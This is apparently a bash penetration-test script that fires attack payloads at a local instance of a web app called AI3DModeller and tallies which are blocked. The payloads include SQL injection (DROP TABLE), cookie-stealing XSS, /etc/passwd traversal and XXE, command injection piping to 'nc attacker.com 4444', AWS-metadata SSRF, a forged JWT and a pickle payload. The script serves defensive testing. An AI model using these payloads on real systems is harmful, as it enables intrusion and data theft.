#!/bin/bash
# Advanced Penetration Testing for AI3DModeller
# Tests sophisticated attack vectors that real hackers use

BASE_URL="${BASE_URL:-http://localhost:5000}"  # override: BASE_URL=http://127.0.0.1:5001 ./tests/...
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

VULNERABILITIES=0
BLOCKED=0

echo "========================================"
echo "🔓 ADVANCED PENETRATION TESTING"
echo "========================================"
echo ""
echo -e "${YELLOW}⚠️  WARNING: This will attempt real attack vectors${NC}"
echo -e "${YELLOW}NOTE (Stage 3): unauthenticated requests hit the login wall (302) before${NC}"
echo -e "${YELLOW}any validator — 302 counts as BLOCKED here. Input validation itself is${NC}"
echo -e "${YELLOW}covered by tests/test_security_units.py. /api/generate_url was REMOVED, so${NC}"
echo -e "${YELLOW}the SSRF checks expect 404 (route gone), not a handler error.${NC}"
echo ""

vuln() {
    echo -e "${RED}🚨 VULNERABILITY FOUND${NC}: $1"
    ((VULNERABILITIES++))
}

blocked() {
    echo -e "${GREEN}✓ Attack Blocked${NC}: $1"
    ((BLOCKED++))
}

warn() {
    echo -e "${YELLOW}⚠ Needs Review${NC}: $1"
}

info() {
    echo -e "${BLUE}ℹ Testing${NC}: $1"
}

echo "=== 1. ADVANCED SQL INJECTION ATTACKS ==="

info "Time-based blind SQL injection"
response=$(curl -s -X POST "$BASE_URL/api/favorites/add" \
    -H "Content-Type: application/json" \
    -d '{"model_path": "test.obj'"'"' OR SLEEP(5)--"}' \
    -w "%{http_code}" -o /tmp/response.txt)
if [ "$response" -eq 403 ] || [ "$response" -eq 400 ] || [ "$response" -eq 302 ]; then
    blocked "Time-based SQLi"
else
    vuln "Time-based SQL injection may be possible (got $response)"
fi

info "Boolean-based blind SQL injection"
response=$(curl -s -X POST "$BASE_URL/api/favorites/add" \
    -H "Content-Type: application/json" \
    -d '{"model_path": "test.obj'"'"' AND 1=1--"}' \
    -w "%{http_code}" -o /tmp/response.txt)
if [ "$response" -eq 403 ] || [ "$response" -eq 400 ] || [ "$response" -eq 302 ]; then
    blocked "Boolean-based SQLi"
else
    vuln "Boolean-based SQL injection may be possible"
fi

info "UNION-based SQL injection"
response=$(curl -s -X POST "$BASE_URL/api/favorites/add" \
    -H "Content-Type: application/json" \
    -d '{"model_path": "test.obj'"'"' UNION SELECT password FROM users--"}' \
    -w "%{http_code}" -o /tmp/response.txt)
if [ "$response" -eq 403 ] || [ "$response" -eq 400 ] || [ "$response" -eq 302 ]; then
    blocked "UNION-based SQLi"
else
    vuln "UNION-based SQL injection may be possible"
fi

info "Stacked queries SQL injection"
response=$(curl -s -X POST "$BASE_URL/api/favorites/add" \
    -H "Content-Type: application/json" \
    -d '{"model_path": "test.obj; DROP TABLE users;--"}' \
    -w "%{http_code}" -o /tmp/response.txt)
if [ "$response" -eq 403 ] || [ "$response" -eq 400 ] || [ "$response" -eq 302 ]; then
    blocked "Stacked queries SQLi"
else
    vuln "Stacked queries may be possible"
fi

echo ""
echo "=== 2. ADVANCED XSS ATTACKS ==="

info "DOM-based XSS"
response=$(curl -s -X POST "$BASE_URL/api/favorites/add" \
    -H "Content-Type: application/json" \
    -d '{"model_path": "<img src=x onerror=alert(document.cookie)>"}' \
    -w "%{http_code}" -o /tmp/response.txt)
if [ "$response" -eq 403 ] || [ "$response" -eq 400 ] || [ "$response" -eq 302 ]; then
    blocked "DOM-based XSS"
else
    vuln "DOM-based XSS may be possible"
fi

info "Reflected XSS with encoding bypass"
response=$(curl -s -X POST "$BASE_URL/api/favorites/add" \
    -H "Content-Type: application/json" \
    -d '{"model_path": "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"}' \
    -w "%{http_code}" -o /tmp/response.txt)
if [ "$response" -eq 403 ] || [ "$response" -eq 400 ] || [ "$response" -eq 302 ]; then
    blocked "URL-encoded XSS"
else
    vuln "URL-encoded XSS may bypass filters"
fi

info "SVG-based XSS"
response=$(curl -s -X POST "$BASE_URL/api/favorites/add" \
    -H "Content-Type: application/json" \
    -d '{"model_path": "<svg/onload=alert(1)>"}' \
    -w "%{http_code}" -o /tmp/response.txt)
if [ "$response" -eq 403 ] || [ "$response" -eq 400 ] || [ "$response" -eq 302 ]; then
    blocked "SVG-based XSS"
else
    vuln "SVG-based XSS may be possible"
fi

echo ""
echo "=== 3. AUTHENTICATION & SESSION ATTACKS ==="

info "Session fixation attack"
response=$(curl -s -b "session_id=attacker_controlled_session" "$BASE_URL/viewer" -w "%{http_code}" -o /dev/null)
if [ "$response" -eq 302 ] || [ "$response" -eq 401 ]; then
    blocked "Session fixation"
else
    warn "Session handling needs review (got $response)"
fi

info "JWT token manipulation (if used)"
response=$(curl -s -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." "$BASE_URL/api/user/profile" -w "%{http_code}" -o /dev/null)
if [ "$response" -eq 401 ] || [ "$response" -eq 403 ] || [ "$response" -eq 302 ]; then
    blocked "JWT manipulation"
else
    warn "JWT validation needs review"
fi

info "Cookie injection"
response=$(curl -s -b "user_id=1; role=admin" "$BASE_URL/viewer" -w "%{http_code}" -o /dev/null)
if [ "$response" -eq 302 ] || [ "$response" -eq 401 ]; then
    blocked "Cookie injection"
else
    warn "Cookie validation needs review"
fi

echo ""
echo "=== 4. PATH TRAVERSAL & FILE INCLUSION ==="

info "Null byte injection"
response=$(curl -s "$BASE_URL/outputs/../../../etc/passwd%00.obj" -w "%{http_code}" -o /dev/null)
if [ "$response" -eq 404 ] || [ "$response" -eq 403 ] || [ "$response" -eq 302 ]; then
    blocked "Null byte injection"
else
    vuln "Null byte injection may work (got $response)"
fi

info "Double encoding bypass"
response=$(curl -s "$BASE_URL/outputs/%252e%252e%252f%252e%252e%252fetc%252fpasswd" -w "%{http_code}" -o /dev/null)
if [ "$response" -eq 404 ] || [ "$response" -eq 403 ] || [ "$response" -eq 302 ]; then
    blocked "Double encoding path traversal"
else
    vuln "Double encoding may bypass filters"
fi

info "Unicode encoding bypass"
response=$(curl -s "$BASE_URL/outputs/\u002e\u002e\u002f\u002e\u002e\u002f" -w "%{http_code}" -o /dev/null)
if [ "$response" -eq 404 ] || [ "$response" -eq 403 ] || [ "$response" -eq 302 ]; then
    blocked "Unicode path traversal"
else
    vuln "Unicode encoding may bypass filters"
fi

echo ""
echo "=== 5. COMMAND INJECTION ==="

info "Command chaining with backticks"
response=$(curl -s -X POST "$BASE_URL/api/favorites/add" \
    -H "Content-Type: application/json" \
    -d '{"model_path": "test.obj`whoami`"}' \
    -w "%{http_code}" -o /tmp/response.txt)
if [ "$response" -eq 403 ] || [ "$response" -eq 400 ] || [ "$response" -eq 302 ]; then
    blocked "Backtick command injection"
else
    vuln "Backtick injection may be possible"
fi

info "Command substitution with $()"
response=$(curl -s -X POST "$BASE_URL/api/favorites/add" \
    -H "Content-Type: application/json" \
    -d '{"model_path": "test.obj$(whoami)"}' \
    -w "%{http_code}" -o /tmp/response.txt)
if [ "$response" -eq 403 ] || [ "$response" -eq 400 ] || [ "$response" -eq 302 ]; then
    blocked "Command substitution injection"
else
    vuln "Command substitution may be possible"
fi

info "Pipe to command"
response=$(curl -s -X POST "$BASE_URL/api/favorites/add" \
    -H "Content-Type: application/json" \
    -d '{"model_path": "test.obj | nc attacker.com 4444"}' \
    -w "%{http_code}" -o /tmp/response.txt)
if [ "$response" -eq 403 ] || [ "$response" -eq 400 ] || [ "$response" -eq 302 ]; then
    blocked "Pipe command injection"
else
    vuln "Pipe injection may be possible"
fi

echo ""
echo "=== 6. HTTP HEADER INJECTION ==="

info "CRLF injection in headers"
response=$(curl -s -H "X-Forwarded-For: 127.0.0.1%0d%0aX-Admin: true" "$BASE_URL/" -w "%{http_code}" -o /dev/null)
if [ "$response" -eq 200 ] || [ "$response" -eq 302 ]; then
    warn "CRLF injection handling needs review"
else
    blocked "CRLF injection in headers"
fi

info "Host header injection"
response=$(curl -s -H "Host: evil.com" "$BASE_URL/" -w "%{http_code}" -o /dev/null)
if [ "$response" -eq 200 ] || [ "$response" -eq 302 ]; then
    warn "Host header validation needs review"
else
    blocked "Host header injection"
fi

echo ""
echo "=== 7. RACE CONDITIONS & TIMING ATTACKS ==="

info "TOCTOU (Time-of-check to time-of-use) race condition"
for i in {1..20}; do
    (curl -s -X POST "$BASE_URL/api/favorites/add" \
        -H "Content-Type: application/json" \
        -d '{"model_path": "test.obj"}' > /dev/null 2>&1) &
done
wait
warn "Race condition test needs an authenticated session to verify (favorites are per-user); 20 unauthenticated POSTs hit the login wall"

echo ""
echo "=== 8. BUSINESS LOGIC ATTACKS ==="

info "Negative numbers in input"
response=$(curl -s -X POST "$BASE_URL/api/log" \
    -H "Content-Type: application/json" \
    -d '{"type": "test", "details": {"count": -9999}}' \
    -w "%{http_code}" -o /dev/null)
if [ "$response" -eq 200 ]; then
    warn "Negative number validation needed"
else
    blocked "Negative number input"
fi

info "Integer overflow attempt"
response=$(curl -s -X POST "$BASE_URL/api/log" \
    -H "Content-Type: application/json" \
    -d '{"type": "test", "details": {"count": 999999999999999999999}}' \
    -w "%{http_code}" -o /dev/null)
if [ "$response" -eq 200 ]; then
    warn "Integer overflow handling needs review"
else
    blocked "Integer overflow"
fi

echo ""
echo "=== 9. API ABUSE & SCRAPING ==="

info "Rapid API calls to scrape data"
start_time=$(date +%s)
for i in {1..50}; do
    curl -s "$BASE_URL/api/models" > /dev/null &
done
wait
end_time=$(date +%s)
duration=$((end_time - start_time))
if [ $duration -lt 10 ]; then
    warn "API may be vulnerable to rapid scraping (50 requests in ${duration}s)"
else
    blocked "Rate limiting effective against scraping"
fi

echo ""
echo "=== 10. SERVER-SIDE REQUEST FORGERY (SSRF) ==="

info "SSRF to internal network"
response=$(curl -s -X POST "$BASE_URL/api/generate_url" \
    -H "Content-Type: application/json" \
    -d '{"image_url": "http://127.0.0.1:22/"}' \
    -w "%{http_code}" -o /dev/null)
if [ "$response" -eq 404 ] || [ "$response" -eq 405 ] || [ "$response" -eq 500 ] || [ "$response" -eq 400 ] || [ "$response" -eq 403 ]; then
    blocked "SSRF to localhost"
else
    vuln "SSRF may be possible - can reach internal services"
fi

info "SSRF to AWS metadata"
response=$(curl -s -X POST "$BASE_URL/api/generate_url" \
    -H "Content-Type: application/json" \
    -d '{"image_url": "http://169.254.169.254/latest/meta-data/"}' \
    -w "%{http_code}" -o /dev/null)
if [ "$response" -eq 404 ] || [ "$response" -eq 405 ] || [ "$response" -eq 500 ] || [ "$response" -eq 400 ] || [ "$response" -eq 403 ]; then
    blocked "SSRF to AWS metadata"
else
    vuln "SSRF to AWS metadata may be possible"
fi

info "SSRF with URL redirect bypass"
response=$(curl -s -X POST "$BASE_URL/api/generate_url" \
    -H "Content-Type: application/json" \
    -d '{"image_url": "http://bit.ly/redirect-to-localhost"}' \
    -w "%{http_code}" -o /dev/null)
if [ "$response" -eq 404 ] || [ "$response" -eq 405 ] || [ "$response" -eq 500 ] || [ "$response" -eq 400 ] || [ "$response" -eq 403 ]; then
    blocked "SSRF redirect bypass"
else
    warn "URL redirect SSRF needs review"
fi

echo ""
echo "=== 11. NOSQL INJECTION (if applicable) ==="

info "MongoDB operator injection"
response=$(curl -s -X POST "$BASE_URL/api/favorites/add" \
    -H "Content-Type: application/json" \
    -d '{"model_path": {"$gt": ""}}' \
    -w "%{http_code}" -o /tmp/response.txt)
if [ "$response" -eq 403 ] || [ "$response" -eq 400 ] || [ "$response" -eq 302 ]; then
    blocked "NoSQL operator injection"
else
    warn "NoSQL injection handling needs review"
fi

echo ""
echo "=== 12. PROTOTYPE POLLUTION (JavaScript) ==="

info "Prototype pollution via JSON"
response=$(curl -s -X POST "$BASE_URL/api/log" \
    -H "Content-Type: application/json" \
    -d '{"__proto__": {"isAdmin": true}}' \
    -w "%{http_code}" -o /dev/null)
if [ "$response" -eq 200 ]; then
    warn "Prototype pollution may be possible"
else
    blocked "Prototype pollution attempt"
fi

echo ""
echo "=== 13. MASS ASSIGNMENT ==="

info "Mass assignment to elevate privileges"
response=$(curl -s -X POST "$BASE_URL/api/user/profile" \
    -H "Content-Type: application/json" \
    -d '{"name": "Test", "role": "admin", "is_admin": true}' \
    -w "%{http_code}" -o /dev/null)
if [ "$response" -eq 200 ]; then
    vuln "Mass assignment may allow privilege escalation"
else
    blocked "Mass assignment blocked"
fi

echo ""
echo "=== 14. XML/XXE ATTACKS (if XML is parsed) ==="

info "XXE (XML External Entity) attack"
response=$(curl -s -X POST "$BASE_URL/api/log" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' \
    -w "%{http_code}" -o /dev/null)
if [ "$response" -eq 415 ] || [ "$response" -eq 400 ]; then
    blocked "XXE attack (XML not accepted or blocked)"
else
    warn "XML handling needs review"
fi

echo ""
echo "=== 15. DESERIALIZATION ATTACKS ==="

info "Python pickle deserialization"
response=$(curl -s -X POST "$BASE_URL/api/log" \
    -H "Content-Type: application/octet-stream" \
    --data-binary "$(python3 -c 'import pickle; import os; print(pickle.dumps(os.system))')" \
    -w "%{http_code}" -o /dev/null)
if [ "$response" -eq 415 ] || [ "$response" -eq 400 ]; then
    blocked "Pickle deserialization"
else
    warn "Deserialization handling needs review"
fi

echo ""
echo "========================================"
echo "📊 PENETRATION TEST SUMMARY"
echo "========================================"
echo -e "${GREEN}Attacks Blocked: $BLOCKED${NC}"
echo -e "${RED}Vulnerabilities Found: $VULNERABILITIES${NC}"
echo ""

if [ $VULNERABILITIES -eq 0 ]; then
    echo -e "${GREEN}🎉 EXCELLENT SECURITY!${NC}"
    echo "No critical vulnerabilities found."
    echo "The application successfully blocked all advanced attack vectors."
    exit 0
else
    echo -e "${RED}⚠️  VULNERABILITIES DETECTED!${NC}"
    echo "Found $VULNERABILITIES potential security issues that need immediate attention."
    echo "Review the output above for details."
    exit 1
fi
